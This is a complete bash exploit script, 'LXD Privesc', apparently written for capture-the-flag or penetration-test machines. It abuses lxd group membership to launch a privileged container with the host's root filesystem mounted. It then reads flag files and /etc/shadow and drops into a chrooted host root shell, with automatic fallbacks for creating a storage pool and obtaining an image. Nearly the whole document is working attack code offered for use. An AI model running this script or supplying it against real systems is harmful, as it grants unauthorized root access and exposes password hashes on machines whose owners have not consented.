#!/bin/bash
# LXD Privesc - Autonomous, fast, fallback-driven
# Usage: ./lxd-privesc.sh [optional: alpine tarball]

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

log()  { echo -e "${GREEN}[+]${NC} $1" >&2; }
warn() { echo -e "${YELLOW}[!]${NC} $1" >&2; }
err()  { echo -e "${RED}[-]${NC} $1" >&2; }

CONTAINER="pwned-$$"
MP="/mnt/root"
ALIAS="pe-$$"

cleanup() {
    "$LXC" stop "$CONTAINER" --force 2>/dev/null
    "$LXC" delete "$CONTAINER" --force 2>/dev/null
}
die() { err "$1"; cleanup 2>/dev/null; exit 1; }

# ========== FIND LXC/LXD ==========
find_bin() {
    command -v "$1" 2>/dev/null && return 0
    for d in /usr/bin /snap/bin /usr/local/bin /usr/sbin /sbin /bin; do
        [ -x "$d/$1" ] && echo "$d/$1" && return 0
    done
    find / -name "$1" -executable -type f 2>/dev/null | head -1
}

LXC=$(find_bin lxc) || die "lxc not found"
LXD=$(find_bin lxd)
log "lxc=$LXC"

id 2>/dev/null | grep -qE '\b(lxd|root)\b' || warn "Not in lxd/root group"

# ========== CLEAN OLD RUNS ==========
for c in $("$LXC" list 2>/dev/null | grep -oP 'pwned-\d+' | sort -u); do
    "$LXC" stop "$c" --force 2>/dev/null; "$LXC" delete "$c" --force 2>/dev/null
done

# ========== POOL (only if missing) ==========
detect_pool() {
    # csv format
    local p
    p=$("$LXC" storage list --format csv 2>/dev/null | head -1 | cut -d, -f1)
    [ -n "$p" ] && echo "$p" && return 0
    # json format
    p=$("$LXC" storage list --format json 2>/dev/null | grep -oP '"name"\s*:\s*"\K[^"]+' | head -1)
    [ -n "$p" ] && echo "$p" && return 0
    # table format (parse | col |)
    p=$("$LXC" storage list 2>/dev/null | awk -F'|' '/^\|/ && !/NAME/{gsub(/ /,"",$2); if($2!="") print $2}' | head -1)
    [ -n "$p" ] && echo "$p" && return 0
    # just try "default"
    "$LXC" storage show default &>/dev/null && echo "default" && return 0
    return 1
}

POOL=$(detect_pool)
if [ -z "$POOL" ]; then
    log "No pool, creating..."
    if "$LXC" storage create default dir 2>/dev/null; then
        POOL="default"
    elif [ -n "$LXD" ]; then
        cat <<'S' | "$LXD" init --preseed 2>/dev/null
config: {}
networks: []
storage_pools:
- { name: default, driver: dir }
profiles:
- { name: default, devices: { root: { path: /, pool: default, type: disk } } }
S
        POOL=$(detect_pool)
    fi
    [ -z "$POOL" ] && die "Cannot create pool"
    log "Pool created: $POOL"
else
    log "Pool: $POOL"
fi

# Fix profile if needed
"$LXC" profile show default 2>/dev/null | grep -q "pool:" || \
    "$LXC" profile device add default root disk path=/ pool="$POOL" 2>/dev/null

# ========== IMAGE (only if none exists) ==========
import_tarball() {
    local f="$1"
    if tar -tzf "$f" 2>/dev/null | grep -q "^metadata.yaml$"; then
        "$LXC" image import "$f" --alias "$ALIAS" 2>/dev/null && echo "$ALIAS" && return 0
    fi
    # Raw rootfs -> wrap with metadata
    local td; td=$(mktemp -d)
    cat > "$td/metadata.yaml" <<M
architecture: "$(uname -m)"
creation_date: $(date +%s)
properties:
  description: "Alpine privesc"
  os: Alpine
  release: "3"
M
    (cd "$td" && tar czf metadata.tar.gz metadata.yaml)
    if "$LXC" image import "$td/metadata.tar.gz" "$f" --alias "$ALIAS" 2>/dev/null; then
        rm -rf "$td"; log "Imported tarball"; echo "$ALIAS"; return 0
    fi
    rm -rf "$td"; return 1
}

get_image() {
    # 1. Already have one? Use it immediately
    local ref=""
    # try csv
    local a fp
    a=$("$LXC" image list --format csv 2>/dev/null | head -1 | cut -d, -f1)
    fp=$("$LXC" image list --format csv 2>/dev/null | head -1 | cut -d, -f2)
    [ -n "$fp" ] && ref="${a:-$fp}"
    # try table parse if csv failed
    if [ -z "$ref" ]; then
        ref=$("$LXC" image list 2>/dev/null | awk -F'|' '/^\|/ && !/ALIAS/{gsub(/ /,"",$2); if($2!="") print $2}' | head -1)
    fi
    # try json
    if [ -z "$ref" ]; then
        ref=$("$LXC" image list --format json 2>/dev/null | grep -oP '"aliases":\[{"name":"\K[^"]+' | head -1)
    fi
    if [ -z "$ref" ]; then
        ref=$("$LXC" image list --format json 2>/dev/null | grep -oP '"fingerprint"\s*:\s*"\K[^"]{12}' | head -1)
    fi
    if [ -n "$ref" ]; then
        echo "$ref"; return 0
    fi

    # 2. User gave a tarball?
    [ -n "$1" ] && [ -f "$1" ] && import_tarball "$1" && return 0

    # 3. Download from remote
    for r in images: ubuntu:; do
        for d in alpine/3.18 alpine/3.17 alpine; do
            "$LXC" image copy "${r}${d}" local: --alias "$ALIAS" 2>/dev/null && echo "$ALIAS" && return 0
        done
    done

    # 4. wget/curl
    local tmp; tmp=$(mktemp)
    local url="https://dl-cdn.alpinelinux.org/alpine/v3.18/releases/x86_64/alpine-minirootfs-3.18.0-x86_64.tar.gz"
    { wget -q -O "$tmp" "$url" 2>/dev/null || curl -sL -o "$tmp" "$url" 2>/dev/null; } && \
        [ -s "$tmp" ] && import_tarball "$tmp" && rm -f "$tmp" && return 0
    rm -f "$tmp"

    # 5. Build from host
    local td; td=$(mktemp -d)
    cat > "$td/metadata.yaml" <<M
architecture: "$(uname -m)"
creation_date: $(date +%s)
properties: { description: "Minimal", os: Linux, release: minimal }
M
    mkdir -p "$td/rootfs"/{bin,dev,etc,proc,sys,tmp}
    for sh in /bin/busybox /bin/bash /bin/sh; do
        [ -x "$sh" ] || continue
        cp "$sh" "$td/rootfs/bin/"
        local n; n=$(basename "$sh")
        [ "$n" != "sh" ] && ln -sf "$n" "$td/rootfs/bin/sh"
        [ "$n" = "busybox" ] && for cmd in ls cat cp rm mkdir mount chroot id whoami head; do ln -sf busybox "$td/rootfs/bin/$cmd"; done
        break
    done
    for ld in /lib /lib64 /lib/x86_64-linux-gnu; do
        [ -d "$ld" ] || continue
        mkdir -p "$td/rootfs$ld"
        cp "$ld"/ld-* "$ld"/libc.so* "$ld"/libc-*.so "$td/rootfs$ld/" 2>/dev/null
    done
    (cd "$td" && tar czf metadata.tar.gz metadata.yaml && tar czf rootfs.tar.gz -C rootfs .)
    "$LXC" image import "$td/metadata.tar.gz" "$td/rootfs.tar.gz" --alias "$ALIAS" 2>/dev/null && \
        rm -rf "$td" && echo "$ALIAS" && return 0
    rm -rf "$td"
    return 1
}

IMAGE=$(get_image "$1")
[ -z "$IMAGE" ] && die "No image obtainable"
log "Image: $IMAGE"

# ========== CONTAINER ==========
log "Creating container: $CONTAINER"
"$LXC" init "$IMAGE" "$CONTAINER" -c security.privileged=true || die "Init failed"
"$LXC" config device add "$CONTAINER" hostfs disk source=/ path="$MP" recursive=true || die "Mount failed"
"$LXC" start "$CONTAINER" || die "Start failed"

# Wait ready (fast poll)
for _ in $(seq 1 10); do "$LXC" exec "$CONTAINER" -- true 2>/dev/null && break; sleep 0.5; done

# ========== FLAGS ==========
echo "" >&2
for f in "$MP/root/proof.txt" "$MP/root/root.txt" "$MP/root/flag.txt" "$MP/root/.flag" "$MP/root/key.txt"; do
    val=$("$LXC" exec "$CONTAINER" -- cat "$f" 2>/dev/null)
    [ -n "$val" ] && echo -e "${CYAN}[FLAG]${NC} $f → ${GREEN}$val${NC}" >&2
done
shadow=$("$LXC" exec "$CONTAINER" -- head -1 "$MP/etc/shadow" 2>/dev/null)
[ -n "$shadow" ] && echo -e "${GREEN}[+]${NC} shadow: $shadow" >&2
echo "" >&2

# ========== CHROOTED ROOT SHELL ==========
HOST_SHELL=""
for sh in /bin/bash /bin/zsh /bin/sh; do
    "$LXC" exec "$CONTAINER" -- test -x "$MP$sh" 2>/dev/null && HOST_SHELL="$sh" && break
done

if [ -n "$HOST_SHELL" ]; then
    log "=== HOST ROOT SHELL === (exit to return)"
    "$LXC" exec "$CONTAINER" -- chroot "$MP" "$HOST_SHELL" -l
else
    warn "Fallback: container shell (host at $MP)"
    "$LXC" exec "$CONTAINER" -- /bin/sh
fi

# ========== CLEANUP ==========
echo "" >&2
read -p "[?] Clean up? (y/N) " -n 1 -r
echo "" >&2
if [[ $REPLY =~ ^[Yy]$ ]]; then
    cleanup; log "Done"
else
    warn "Container left: $LXC stop $CONTAINER --force && $LXC delete $CONTAINER --force"
fi
